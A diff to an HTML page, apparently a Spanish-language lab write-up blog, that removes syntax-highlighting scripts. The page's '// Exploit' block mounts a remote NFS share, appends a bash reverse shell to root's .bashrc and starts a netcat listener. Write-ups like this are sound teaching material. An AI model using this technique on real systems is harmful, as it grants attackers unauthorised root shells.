@@ -7,8 +7,6 @@
   <link rel="stylesheet" href="/css/styles.css"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai-sublime.min.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-  <script>hljs.highlightAll();</script>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>
 </head>
 <body class="fade">
@@ -42,7 +40,7 @@
     <p>Una máquina que combina <code>NFS Mount</code> con acceso a <code>.bashrc</code> y ejecución automática. Perfecta para una escalada elegante y sin ruido.</p>
 
     <h2>// Exploit</h2>
-    <pre><code class="language-bash">sudo mount -t nfs 10.10.10.67:/ /mnt/nfs
+    <pre><code>sudo mount -t nfs 10.10.10.67:/ /mnt/nfs
 echo "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" >> /mnt/nfs/root/.bashrc
 nc -lvnp 4444</code></pre>
 
